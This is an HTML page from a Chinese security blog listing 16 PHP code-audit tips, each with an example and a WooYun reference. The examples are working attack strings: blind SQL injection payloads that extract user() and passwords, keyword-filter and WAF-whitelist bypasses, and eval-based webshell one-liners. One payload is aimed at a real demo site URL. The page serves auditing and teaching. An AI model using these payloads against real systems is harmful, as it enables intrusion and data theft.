@@ -1,0 +1,278 @@
+
+
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>PHP代码审计tips | XEI7 乱M集</title>
+  <meta name="author" content="XEI7">
+  
+  <meta name="description" content="https://www.91ri.org/15074.html">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="PHP代码审计tips"/>
+  <meta property="og:site_name" content="XEI7 乱M集"/>
+
+  
+    <meta property="og:image" content="undefined"/>
+  
+
+  <link href="/imgs/favicon.ico" rel="icon" type="image/x-ico">
+  <link rel="alternate" href="/atom.xml" title="XEI7 乱M集" type="application/atom+xml">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+</head>
+
+
+<body>
+  <header><div>
+		
+			<div id="imglogo">
+				<a href="/"><img src="/imgs/logo.png" alt="XEI7 乱M集" title="XEI7 乱M集"/></a>
+			</div>
+			
+			<div id="textlogo">
+				<h1 class="site-name">XEI7 乱M集</h1>
+				<h2 class="blog-motto"></h2>
+			</div>
+			<nav class="animated">
+				<ul>
+					
+						<li><a href="/">Home</a></li>
+					
+						<li><a href="/archives">Archives</a></li>
+					
+						<li><a href="/about">About</a></li>
+					
+						<li><a href="/urls">_</a></li>
+					
+
+				</ul>
+			</nav>			
+</div>
+</header>
+  <div id="content" class="inner">
+    <div id="main-col" class="alignleft"><div id="wrapper"><article class="post">
+  
+    <div class="gallery">
+  <div class="photoset">
+    
+      <img src="">
+    
+  </div>
+  <div class="control">
+    <div class="prev"></div>
+    <div class="next"></div>
+  </div>
+</div>
+  
+  <div class="post-content">
+    <header class="article-info clearfix">
+  <h1 itemprop="name">
+	PHP代码审计tips
+  </h1>
+  <p class="article-author">By
+    
+      <a href="https://xei7.github.io" title="XEI7">XEI7</a>
+    </p>
+  <p class="article-time">
+    <time datetime="2016-01-10T10:04:13.000Z" itemprop="datePublished">2016-01-10</time>
+    更新日期:<time datetime="2016-10-10T08:55:09.882Z" itemprop="dateModified">2016-10-10</time>
+    
+  </p>
+</header>
+    <div class="entry">
+		
+        <p><a href="https://www.91ri.org/15074.html" target="_blank" rel="external">https://www.91ri.org/15074.html</a><br><a id="more"></a><br>PHP代码审计tips<br>1、$_SERVER[‘PHP_SELF’]和$_SERVER[‘QUERY_STRING’]，而$_SERVER并没有转义，造成了注入。<br>例如：<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/easy/index.php/aaa',(<span class="keyword">select</span><span class="comment">/**/</span><span class="keyword">if</span>((<span class="keyword">select</span><span class="comment">/**/</span><span class="keyword">ord</span>(<span class="keyword">substr</span>(<span class="keyword">user</span>(),<span class="number">1</span>,<span class="number">1</span>)))=<span class="number">114</span>,<span class="keyword">sleep</span>(<span class="number">3</span>),<span class="number">0</span>)),<span class="number">1</span>)#</div></pre></td></tr></table></figure></p>
+<p>2、update更新时没有重构更新序列，导致更新其他关键字段（金钱、权限）</p>
+<p>例如：</p>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">id=<span class="number">1</span>&amp;data=<span class="number">1991</span><span class="number">-03</span><span class="number">-16</span>&amp;<span class="section">money</span>=<span class="number">10000000</span></div></pre></td></tr></table></figure>
+<p><a href="http://www.wooyun.org/bugs/wooyun-2014-069507" target="_blank" rel="external">http://www.wooyun.org/bugs/wooyun-2014-069507</a></p>
+<p>3、在 php中 如果使用了一个未定义的常量，PHP 假定想要的是该常量本身的名字，如同用字符串调用它一样（CONSTANT 对应 “CONSTANT”）。此时将发出一个 E_NOTICE 级的错误（参考<a href="http://php.net/manual/zh/language.constants.syntax.php）" target="_blank" rel="external">http://php.net/manual/zh/language.constants.syntax.php）</a></p>
+<p>例如：</p>
+<figure class="highlight autoit"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">未定义常量<span class="keyword">if</span>(IN_ADMIN != <span class="literal">TRUE</span>) 等式不成立，非<span class="number">0</span>、<span class="literal">null</span>都为<span class="literal">true</span></div></pre></td></tr></table></figure>
+<p><a href="http://www.wooyun.org/bugs/wooyun-2014-069503" target="_blank" rel="external">http://www.wooyun.org/bugs/wooyun-2014-069503</a></p>
+<p>4、PHP中自编写对标签的过滤或关键字过滤，应放在strip_tags等去除函数之后，否则引起过滤绕过。<br>例如：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">mystrip_tags</span><span class="params">($string)</span></span></div><div class="line">&#123;</div><div class="line">$string = remove_xss($string);</div><div class="line">$string = new_html_special_chars($string);</div><div class="line">$string = strip_tags($string);<span class="comment">//remove_xss在strip_tags之前调用，所以很明显可以利用strip_tags函数绕过,在关键字中插入html标记.</span></div><div class="line"><span class="keyword">return</span> $string;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p><a href="http://www.wooyun.org/bugs/wooyun-2014-070316" target="_blank" rel="external">http://www.wooyun.org/bugs/wooyun-2014-070316</a></p>
+<p>对关键字过滤之后存在字符替换、html去除等操作可构造多余字符绕过。</p>
+<p>例如：提交</p>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">user<span class="comment">/**/</span>W&lt;a&gt;HERE<span class="comment">/**/</span>IF((S&lt;a&gt;ELECT<span class="comment">/**/</span>A&lt;a&gt;SCII(S&lt;a&gt;UBSTRING(PASSWORD,<span class="number">1</span>,<span class="number">1</span>))F&lt;a&gt;ROM<span class="comment">/**/</span>ts_user<span class="comment">/**/</span>L&lt;a&gt;IMIT <span class="number">1</span>)=<span class="number">101</span>,<span class="number">1</span>=S&lt;a&gt;LEEP(<span class="number">2.02</span>),<span class="number">0</span>)%<span class="number">23</span></div></pre></td></tr></table></figure>
+<p>由于全局关键字过滤之后存在strip_tags()函数可绕过。</p>
+<p><a href="http://www.wooyun.org/bugs/wooyun-2014-077877" target="_blank" rel="external">http://www.wooyun.org/bugs/wooyun-2014-077877</a></p>
+<p><a href="http://www.wooyun.org/bugs/wooyun-2014-077689" target="_blank" rel="external">http://www.wooyun.org/bugs/wooyun-2014-077689</a></p>
+<p>5、当可控变量进入双引号中时可形成webshell<br>例如：</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$a = <span class="string">"<span class="subst">$&#123;@eval($_POST[<span class="keyword">s</span>])&#125;</span>"</span>;</div><div class="line">$a = <span class="string">"<span class="subst">$&#123;$&#123;<span class="keyword">eval</span>($_POST[<span class="keyword">s</span>])&#125;</span>&#125;"</span>;</div></pre></td></tr></table></figure>
+<p>因此代码执行使用${file_put_contents($_GET[f],$_GET[p])}可以生成webshell。</p>
+<p><a href="http://www.wooyun.org/bugs/wooyun-2014-085518" target="_blank" rel="external">http://www.wooyun.org/bugs/wooyun-2014-085518</a></p>
+<p>6、宽字节转编码过程中出现宽字节注入<br><figure class="highlight gcode"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">例如：测试输入 \-&gt;<span class="meta">%</span><span class="number">5</span>C <span class="meta">%</span>e<span class="number">5</span><span class="meta">%</span><span class="number">5</span>c<span class="meta">%</span><span class="number">5</span>c<span class="string">' 两个\\ 则单引号出来</span></div></pre></td></tr></table></figure></p>
+<p>7、构造查询语句时无法删除目标表中不存在字段时可使用mysql多表查询绕过。</p>
+<p>例如：<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span> uid,<span class="keyword">password</span> <span class="keyword">from</span> <span class="keyword">users</span>,admins；</div></pre></td></tr></table></figure></p>
+<p>(uid存在于users、password存在于admins）<br>8、mysql中（反引号）能作为注释符，且会自动闭合末尾没有闭合的反引号。无法使用注释符的情况下使用别名as+反引号可闭合其后语句。</p>
+<p>例如：<br><figure class="highlight clean"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">select `username`,`password` <span class="keyword">from</span> pre_common_statuser <span class="keyword">as</span> ` <span class="keyword">as</span> statistic <span class="keyword">from</span> common_stat <span class="keyword">where</span> uid=<span class="number">1</span></div></pre></td></tr></table></figure></p>
+<p>此处（password from pre_common_statuser as ）为注入语句，使用别名as与自带无视其后语句。</p>
+<p><a href="http://www.wooyun.org/bugs/wooyun-2014-074970" target="_blank" rel="external">http://www.wooyun.org/bugs/wooyun-2014-074970</a></p>
+<p>9、mysql的类型强制转换可绕过PHP中empty()函数对0的false返回。</p>
+<p>例如：提交<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/?test=<span class="number">0</span>axxx    -&gt; <span class="keyword">empty</span>($_GET[<span class="string">'test'</span>]) =&gt; 返回真</div></pre></td></tr></table></figure></p>
+<p>但是mysql中提交其0axxx到数字型时强制转换成数字0</p>
+<p><a href="http://zone.wooyun.org/content/15859" target="_blank" rel="external">http://zone.wooyun.org/content/15859</a></p>
+<p>10、存在全局过滤时观察过滤条件是否有if判断进入，cms可能存在自定义safekey不启用全局过滤。通过程序遗留或者原有界面输出safekey导致绕过。<br>例如：</p>
+<p>Default<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span>($config[<span class="string">'sy_istemplate'</span>]!=<span class="string">'1'</span> || md5(md5($config[<span class="string">'sy_safekey'</span>]).$_GET[<span class="string">'m'</span>])!=$_POST[<span class="string">'safekey'</span>])</div><div class="line">&#123;</div><div class="line"><span class="keyword">foreach</span>($_POST <span class="keyword">as</span> $id=&gt;$v)&#123;</div><div class="line">safesql($id,$v,<span class="string">"POST"</span>,$config);</div><div class="line">$id = sfkeyword($id,$config);</div><div class="line">$v = sfkeyword($v,$config);</div><div class="line">$_POST[$id]=common_htmlspecialchars($v);</div><div class="line">&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p><a href="http://www.wooyun.org/bugs/wooyun-2014-070126" target="_blank" rel="external">http://www.wooyun.org/bugs/wooyun-2014-070126</a></p>
+<p>11、由于全局过滤存在白名单限定功能，可使用无用参数带入绕过。<br>例如：<br><figure class="highlight xquery"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> ($webscan_<span class="keyword">switch</span>&amp;&amp;webscan_white($webscan_white_directory,$webscan_white_url))</div></pre></td></tr></table></figure></p>
+<p>其中具体过滤代码如下：</p>
+<p>//后台白名单,后台操作将不会拦截,添加”|”隔开白名单目录下面默认是网址带 admin /dede/ 放行</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="variable">$webscan_white_directory</span>=<span class="string">'admin|\/dede\/|\/install\/'</span>;</div><div class="line"><span class="regexp">//u</span>rl白名单,可以自定义添加url白名单,默认是对phpcms的后台url放行</div><div class="line"><span class="regexp">//</span>写法：比如phpcms 后台操作url index.php?m=admin php168的文章提交链接post.php?job=postnew&amp;step=post ,dedecms 空间设置edit_space_info.php</div></pre></td></tr></table></figure>
+<figure class="highlight sml"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$webscan_white_url = <span class="built_in">array</span>(<span class="symbol">'index</span>.php' =&gt; <span class="symbol">'admin_dir</span>=admin',<span class="symbol">'post</span>.php' =&gt; <span class="symbol">'job</span>=postnew&amp;step=post',<span class="symbol">'edit_space_info</span>.php'=&gt;<span class="string">''</span>);</div></pre></td></tr></table></figure>
+<p>只要让传入参数存在白名单目录或参数即可绕过。<br>利用白名单目录：</p>
+<figure class="highlight ada"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://www.target.com/index.php/dede/?m=foo&amp;c=bar&amp;id=<span class="number">1</span>' <span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> union <span class="keyword">select</span> xxx</div></pre></td></tr></table></figure>
+<p>由于请求中包含了白名单目录/dede/，所以放行。<br>利用白名单参数：<br><figure class="highlight ada"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://www.target.com/index.php?m=foo&amp;c=bar&amp;admin_dir=admin&amp;id=<span class="number">1</span>' <span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> union <span class="keyword">select</span> xxx</div></pre></td></tr></table></figure></p>
+<p>请求中包含了白名单参数所以放行。</p>
+<p><a href="http://www.wooyun.org/bugs/wooyun-2014-070126" target="_blank" rel="external">http://www.wooyun.org/bugs/wooyun-2014-070126</a></p>
+<p>12、字符串截断函数获取定长数据，截取\或\’前一位，闭合语句。<br>利用条件必须是存在两个可控参数，前闭合，后注入。<br>例如：</p>
+<figure class="highlight stata"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> (<span class="built_in">strlen</span>(<span class="variable">$u_email</span>)&gt;32) &#123; <span class="variable">$u_email</span> = substring(<span class="variable">$u_email</span>,32);&#125;</div><div class="line"><span class="keyword">if</span> (<span class="built_in">strlen</span>(<span class="variable">$u_qq</span>)&gt;16) &#123; <span class="variable">$u_qq</span> = substring(<span class="variable">$u_qq</span>,16);&#125;</div><div class="line"><span class="keyword">if</span> (<span class="built_in">strlen</span>(<span class="variable">$u_phone</span>)&gt;16) &#123; <span class="variable">$u_phone</span> = substring(<span class="variable">$u_phone</span>,16);&#125;</div><div class="line"><span class="variable">$u_phone</span>=123456789012345\ 带入：</div><div class="line"><span class="keyword">UPDATE</span> mac_user <span class="keyword">SET</span> u_qq='<span class="variable">$u_qq</span>',u_email='<span class="variable">$u_email</span>',u_phone='123456789012345\',u_question='<span class="variable">$u_question</span>',u_answer='<span class="variable">$u_answer</span>',u_password='<span class="variable">$u_password</span>' WHERE u_id=1</div><div class="line">http:<span class="comment">//www.wooyun.org/bugs/wooyun-2014-082973</span></div></pre></td></tr></table></figure>
+<p>13、过滤了空格，逗号的注入，可使用括号包裹绕过。具体如遇到select from（关键字空格判断的正则，且剔除/**/等）可使用括号包裹查询字段绕过。<br>例如：<br><figure class="highlight lisp"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">select(<span class="name">location</span>)from(<span class="name">website</span>)<span class="comment">;</span></div></pre></td></tr></table></figure></p>
+<p><a href="http://www.wooyun.org/bugs/wooyun-2014-079379" target="_blank" rel="external">http://www.wooyun.org/bugs/wooyun-2014-079379</a></p>
+<p>另外一种方式：<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span>&#123;x table_name&#125;<span class="keyword">from</span>&#123;x information_schema.tables&#125;</div><div class="line"><span class="keyword">select</span>&#123;x(<span class="keyword">name</span>)&#125;<span class="keyword">from</span>&#123;x(manager)&#125;;</div><div class="line"><span class="keyword">select</span>&#123;wooyun<span class="string">'zone'</span>&#125;<span class="keyword">from</span>&#123;mysql.user&#125;</div><div class="line"><span class="keyword">select</span>&#123;x+table_name&#125;<span class="keyword">from</span>&#123;x(information_schema.tables)&#125;</div></pre></td></tr></table></figure></p>
+<p>14、由于PHP弱类型验证机制，导致==、in_array()等可通过强制转换绕过验证。<br>例如：<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">in_array($_GET['x'],array(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>))</div><div class="line">访问?test=’<span class="number">1</span>’testtest可判断成功。</div></pre></td></tr></table></figure></p>
+<p><a href="http://www.freebuf.com/articles/web/55075.html" target="_blank" rel="external">http://www.freebuf.com/articles/web/55075.html</a></p>
+<p>15、WAF或者过滤了and|or的情况可以使用&amp;&amp;与||进行盲注。<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="literal">FALSE</span>的情况：</div><div class="line"><span class="number">1</span> || <span class="number">0</span></div><div class="line"><span class="literal">TRUE</span>的情况：</div><div class="line"><span class="number">1</span> || <span class="number">1</span></div></pre></td></tr></table></figure></p>
+<p>例如：<br><figure class="highlight aspectj"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://demo.74cms.com/user/user_invited.php?id=1%20||%20strcmp(substr(user(),1,13),<span class="keyword">char</span>(114,111,111,116,64,108,111,99,97,108,104,111,115,116))&amp;act=invited</div></pre></td></tr></table></figure></p>
+<p>16、windows下php中访问文件名使用”&lt;” “&gt;”将会被替换成”*” “?”，分别代表N个任意字符与1个任意字符。<br>例如：<br><figure class="highlight autoit"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">file_get_contents(<span class="string">"/images/"</span>.$_GET[<span class="string">'a'</span>].<span class="string">".jpg"</span>)<span class="comment">;</span></div></pre></td></tr></table></figure></p>
+<p>可使用test.php?a=../a&lt;%00访问对应php文件。</p>
+<p><a href="http://www.phpbug.cn/archives/87.html#more-87" target="_blank" rel="external">http://www.phpbug.cn/archives/87.html#more-87</a></p>
+
+    </div>
+    <footer>
+        
+  
+  <div class="categories">
+    <a href="/categories/web/">web</a>
+  </div>
+
+         
+        <div class="clearfix"></div>
+    </footer>
+  </div>
+</article>
+
+ <nav id="pagination" >
+    
+    <a href="/2016/02/01/黑客攻防技术宝典web实战篇笔记5/" class="alignleft prev" title="黑客攻防技术宝典web实战篇笔记5">黑客攻防技术宝典web实战篇笔记5</a>
+    
+    
+    <a href="/2016/01/08/黑客攻防技术宝典web实战篇笔记4/" class="alignright next" title="黑客攻防技术宝典web实战篇笔记4">黑客攻防技术宝典web实战篇笔记4</a>
+    
+    <div class="clearfix"></div>
+</nav>
+
+
+
+	
+	<section id="comment">
+		<!-- 多说评论框 start -->
+		<div class="ds-thread" data-thread-key="2016/01/10/PHP代码审计tips/" data-title="PHP代码审计tips" data-url="https://xei7.github.io/2016/01/10/PHP代码审计tips/"></div>
+		<!-- 多说评论框 end -->
+		<!-- 多说公共JS代码 start (一个网页只需插入一次) -->
+		<script type="text/javascript">
+		var duoshuoQuery = {short_name:"xei7"};
+		(function() {
+			var ds = document.createElement('script');
+			ds.type = 'text/javascript';ds.async = true;
+			ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+			ds.charset = 'UTF-8';
+			(document.getElementsByTagName('head')[0] 
+			 || document.getElementsByTagName('body')[0]).appendChild(ds);
+		})();
+		</script>
+		<!-- 多说公共JS代码 end -->
+	</section>
+	
+</div></div>
+    <aside id="sidebar" class="alignright">
+  
+<div class="widget tag">
+  <h3 class="title">分类</h3>
+  <ul class="entry">
+  
+    <li><a href="/categories/bluetooth/">bluetooth</a><small>2</small></li>
+  
+    <li><a href="/categories/kali/">kali</a><small>3</small></li>
+  
+    <li><a href="/categories/linux/">linux</a><small>2</small></li>
+  
+    <li><a href="/categories/python/">python</a><small>1</small></li>
+  
+    <li><a href="/categories/sdr/">sdr</a><small>1</small></li>
+  
+    <li><a href="/categories/sqlmap/">sqlmap</a><small>3</small></li>
+  
+    <li><a href="/categories/web/">web</a><small>7</small></li>
+  
+    <li><a href="/categories/中医/">中医</a><small>4</small></li>
+  
+    <li><a href="/categories/安全/">安全</a><small>5</small></li>
+  
+    <li><a href="/categories/网络/">网络</a><small>1</small></li>
+  
+    <li><a href="/categories/逆向/">逆向</a><small>2</small></li>
+  
+  </ul>
+</div>
+
+
+  
+<div class="widget tagcloud">
+  <h3 class="title">标签云</h3>
+  <div class="entry">
+    <a href="/tags/aircrack/" style="font-size: 10px;">aircrack</a> <a href="/tags/bash/" style="font-size: 10px;">bash</a> <a href="/tags/bluetooth/" style="font-size: 12.5px;">bluetooth</a> <a href="/tags/cookie/" style="font-size: 10px;">cookie</a> <a href="/tags/elf/" style="font-size: 12.5px;">elf</a> <a href="/tags/kali/" style="font-size: 12.5px;">kali</a> <a href="/tags/linux/" style="font-size: 10px;">linux</a> <a href="/tags/python/" style="font-size: 10px;">python</a> <a href="/tags/rtl-sdr/" style="font-size: 10px;">rtl-sdr</a> <a href="/tags/sqlmap/" style="font-size: 12.5px;">sqlmap</a> <a href="/tags/sqlmapapi/" style="font-size: 10px;">sqlmapapi</a> <a href="/tags/waf/" style="font-size: 10px;">waf</a> <a href="/tags/web/" style="font-size: 17.5px;">web</a> <a href="/tags/wifi/" style="font-size: 10px;">wifi</a> <a href="/tags/wireshark/" style="font-size: 10px;">wireshark</a> <a href="/tags/xss/" style="font-size: 10px;">xss</a> <a href="/tags/中医/" style="font-size: 15px;">中医</a> <a href="/tags/五行/" style="font-size: 10px;">五行</a> <a href="/tags/养生/" style="font-size: 12.5px;">养生</a> <a href="/tags/审计/" style="font-size: 10px;">审计</a> <a href="/tags/工控/" style="font-size: 10px;">工控</a> <a href="/tags/批量/" style="font-size: 10px;">批量</a> <a href="/tags/易经/" style="font-size: 10px;">易经</a> <a href="/tags/端口/" style="font-size: 10px;">端口</a> <a href="/tags/笔记/" style="font-size: 20px;">笔记</a> <a href="/tags/绕过/" style="font-size: 10px;">绕过</a> <a href="/tags/重装/" style="font-size: 10px;">重装</a> <a href="/tags/随笔/" style="font-size: 10px;">随笔</a>
+  </div>
+</div>
+
+
+  <div class="widget tag">
+<h3 class="title">友情链接</h3>
+<ul class="entry">
+<li><a href="http://blog.sina.com.cn/3838120958 " title=" Blog" target="_blank">_</a></li>
+</ul>
+</div>
+</aside>
+    <div class="clearfix"></div>
+  </div>
+<!-- mathjax config similar to math.stackexchange -->
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [ ['$','$'], ["\\(","\\)"] ],
+      processEscapes: true
+    }
+  });
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+      tex2jax: {
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+      }
+    });
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for(i=0; i < all.length; i += 1) {
+            all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+    });
+</script>
+
+<!--script type="text/javascript" src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"-->
+</script>
+</body>
+</html>
+
+
